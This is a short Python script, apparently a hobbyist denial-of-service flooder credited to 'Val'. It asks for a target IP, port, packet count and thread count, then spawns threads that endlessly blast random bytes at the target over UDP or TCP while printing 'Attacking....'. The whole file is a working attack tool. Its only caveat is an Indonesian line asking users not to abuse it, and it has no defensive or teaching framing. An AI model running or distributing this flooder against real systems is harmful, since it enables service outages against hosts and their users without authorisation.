import random
import socket
import threading
import os

os.system("clear")
print("Made By Val.")
print("Ingat!! Jangan Abuse Atau Untuk Pamer Skill!!")
ip = str(input(" Ip: "))
port = int(input(" Port: "))
choice = str(input(" You Sure?(y/n): "))
times = int(input(" Paket: "))
threads = int(input(" Thread: "))
def run():
  data = random._urandom(1024)
  i = random.choice(("[HD]","[HD]","[HD]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" [+] Attacking....")
    except:
      print("[?] DOWN!?")

def run2():
  data = random._urandom(16)
  i = random.choice(("[HD]","[HD]","[HD]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" [+] Valentine Attacking.... ")
    except:
      s.close()
      print("[!] Down!?")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()